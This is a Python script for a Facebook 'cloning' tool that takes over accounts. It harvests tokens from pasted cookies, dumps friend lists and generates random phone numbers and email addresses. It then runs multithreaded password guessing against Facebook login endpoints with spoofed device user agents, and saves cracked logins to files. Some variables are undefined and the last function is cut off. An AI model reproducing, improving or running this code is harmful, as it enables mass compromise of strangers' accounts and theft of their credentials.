fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python AKING.py')
android_models=[]
try:
	st = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	us=requests.get('https://raw.githubusercontent.com/AKING110/User-Agent/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
logo=("""\033[1;37m
\033[1;35m8888888 .d88888b.  8888888b.         d8888 
\033[1;33m  888  d88P" "Y88b 888   Y88b       d88888 
\033[1;32m  888  888     888 888    888      d88P888 
\033[1;31m  888  888     888 888   d88P     d88P 888 
\033[1;36m  888  888     888 8888888P"     d88P  888 
\033[1;32m  888  888 Y8b 888 888 T88b     d88P   888 
 \033[1;33m 888  Y88b.Y8b88P 888  T88b   d8888888888 
\033[1;31m8888888 "Y888888"  888   T88b d88P     888 
\033[1;35m              Y8b                          
\033[1;37m ----------------------------------------------BRAND   
----------------------------------------------
 Author    : IMTIAZ LKING
 Github    : GANDO NO 110
 Facebook  : GARAM GANDO
 Tool Name : ULLU KA PATTA
 Type type : LKING KI GAND FREE
 Version   : 5.5
----------------------------------------------
 LKING GARAM GANDO Version 5.5 
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
try:os.mkdir('data')
except:pass
def c_login():
	clear()
	print(' [1] Login with cookies \n [2] Get free cookies\n [0] Back menu')
	linex()
	xx=input(' Choose: ')
	if xx in ['1','01']:
		login()
	elif xx in ['2','02']:
		clear()
		print('  Follow over facebook page for more activities ❤ ');time.sleep(1)
		isd = ('100084680097792')
		os.system(f'xdg-open https://www.facebook.com/{isd}/posts/pfbid02RxpxwxmkuN8NmoYpP7du8tomrUWXjLsK6FJtCnveNwPHxxg53udvZZUiu24hudDPl/?app=fbl')
		c_login()
def login():
	clear()
	cookies = input(' Put cookies: ')
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
		find_token = re.search("(EAB\w+)", data.text)
		open("data/token", "w").write(find_token.group(1))
		open("data/coki","w").write(cookies)
		tok=open('data/token','r').read()
		print(' Cookies login has been successfull...')
		time.sleep(1)
		menu()
	except KeyError:
		exit('\033[1;31m Cookies has been expired...')
	except requests.exceptions.ConnectionError:
		exit(' internet connection error...')
		os.system('data/token')
	except AttributeError:
		print('\033[1;31m Cookies has been expired...')
		os.system('data/token')
		c_login()
def create():
	clear()
	try:
		coki=open("cokie/coki","r").read()
		token=open("coki/token","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token, cookies = {'cookies':coki})
		a = json.loads(otw.text)
		try:
			nama = a["name"]
		except:
			nama = a["user"]
	except:
			print('\033[1;31m Cookies has expired ')
			time.sleep(1)
			c_login()
	print(f" Welcome : \033[1;32m{nama} \033[1;37m")
	pass
def public():
	usrr=[]
	try:
		tok = open('data/token','r').read()
		cok = open('data/coki','r').read()
		tokenku.append(tok)
	except IOError:
		print('\033[1;31mYour cookies han expired...');time.sleep(1)
		c_login()
	create()
	time.sleep(1)
	clear()
	try:
		jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
	except ValueError:
		exit(' Put only digits not latters ')
	if jum<1 or jum>5000:
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'\033[1;37m Put link no.{yz+0}: ')
		usrr.append(kl)
	linex()
	print(' All method working try 1 by 1 ')
	linex()
	print(' [1] Method 1 (best) \n [2] Method 2\n [3] Method 3')
	linex()
	mthd = input(' Choose method: ')
	linex()
	print(' Do you went show cp account? (y/n): ')
	linex()
	cx=input(' Choose: ')
	if cx in ['y','N','yes','no','2']:
		pcp.append('y')
	else:
		pcp.append('y')
	linex()
	print('\033[1;32m Dumping friend list...\033[1;37m')
	linex()
	for userr in usrr:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['friends']:
				try:
					iso = (mi['id']+'|'+mi['uid'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			exit(f' No internet connection')
	try:
		plist = []
		try:
			ps_limit = int(input(' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		linex()
		print('\033[1;32m exp: first last,firtslast,first123')
		linex()
		for i in range(limit):
			plist.append(input(f' Put password {i+1}: '))
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(id))
			print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
			print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
			linex()
			for user in id:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(api,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(ffb,ids,names,passlist)
				else:
					crack_submit.submit(mmm,ids,names,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python AKING.py')
	except requests.exceptions.ConnectionError:
		exit(f' No internet connection')
	except (KeyError,IOError):
		print(f' No friends for {userr}')
		time.sleep(3)
		public()
def menu():
			clear()
			status=('\033[1;32m Premium\033[1;37m')
			print(' Status : '+status)
			print(' This tools for mix ids cloning')
			linex()
			print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crcak\n [6] WhatsApp Group (join)\n [7] Download Vpn\n [8] How To Use Video\n [0] Exit menu')
			linex()
			xd=input(' Choose an option: ')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				print(' All method working try 1 by 1 ')
				linex()
				print(' [1] Method 1 (for new ids)\n [2] Method 2 (for new ids)\n [3] Method 3 (use for mix ids)')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' How many passwords do you want to add ? '))
				except:
					ps_limit =1
				linex()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				linex()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','N','yes','No','2']:
					pcp.append('y')
				else:
					pcp.append('y')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
					print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(mmm,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python AKING.py')
			elif xd in ['2','02']:
				#create()
				#dz._login()
				print(' Next update ');exit()
			elif xd in ['3','03']:
				public()
			elif xd in ['4','04']:
				clear()
				print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
				linex()
				x=input(' Choose: ')
				if x in ['1','01']:
					pak()
				elif x in ['2','02']:
					bd()
				elif x in ['3','03']:
					gmail()
				else:
					menu()
			elif xd in ['5','05']:
				gmail()
			elif xd in ['6','06']:
				wx=('Dsj9JMWoixk4Qsje0Ng3nA')
				os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
			elif xd in ['7','07']:
				os.system('xdg-open mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
			elif xd in ['8','08']:
				os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')
		
def pak():
		user=[]
		clear()
		print('\033[1;31m Code example: 0306,0315,0335,0345')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' [1] Clone with 7+11 digit pass (v-fast)\n [2] Clone with auto pass (fast)\n [3] Clone with auto pass v2 (slow-best) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as Aking:	
			clear()
			tl = str(len(user))
			print(' Total account : \033[1;32m'+tl+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
			print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
			print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [ids]
				elif pcs in ['2','02']:
					passlist = [ids,'khankhan','khan1122','Ali786','khan1234']
				else:
					passlist = [ids,'khankhan','khan1122','Ali786','khan1234','Ali123','ali786','khan123','khan12345']
				if mthd in ['1','01']:
					Aking.submit(rcrack1,ids,passlist)
				else:
					Aking.submit(rcrack,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python AKING.py')
def bd():
		user=[]
		clear()
		print('\033[1;31m Code example: 016,017,018,019')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as Aking:	
			clear()
			tl = str(len(user))
			print(' Total account : \033[1;32m'+tl+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
			print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
			print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [ids]
				if mthd in ['1','01']:
					Aking.submit(rcrack1,ids,passlist)
				else:
					Aking.submit(rcrack,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python AKING.py')
def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com , @yahoo.com etc...')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+first.lower()+mail+domain+'|'+first+' '+first+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as Aking:
			total = str(len(fo))
			clear()
			print(' Total account : \033[1;32m'+total+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
			print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'First'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+' '+ls,fs+'',fs+'',fs+'']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+first_name,first_name+'123']
				else:
					passlist = [fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'',fs+'',fs+'',fs+'']
				if mthd in ['1','01']:
					Aking.submit(rcrack1,ids,passlist)
				else:
					Aking.submit(rcrack,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python AKING.py')
def api(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('Last',fn).replace('First',ln.lower()).replace('Last',ln).replace('Name',names).replace('',names.lower())
				
				application_version = str(random.randint(111,555))+'.1.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
				application_version_code=str(random.randint(000000000,999999999))
				__iam_genius = random.choice(android_models)
				phone_model = __iam_genius.split('|')[0]
				phone_company = __iam_genius.split('|')[1]
				dimensions = __iam_genius.split('|')[2]
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=3.0,height=360,width=800};]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
				device_family_id = str(uuid.uuid4())
				adid = str(uuid.uuid4())
				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
				data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
				url = 'https://b-api.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [LKING-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/LKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/LKING-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/LKING-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)
		except Exception as e:
			pass
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			ua1=random.choice(rug)
			#aziz da header dy da chang kawa ha
			session.headers.update({"Host":"p.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua1, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			#aw da wrsa ham chng kawa
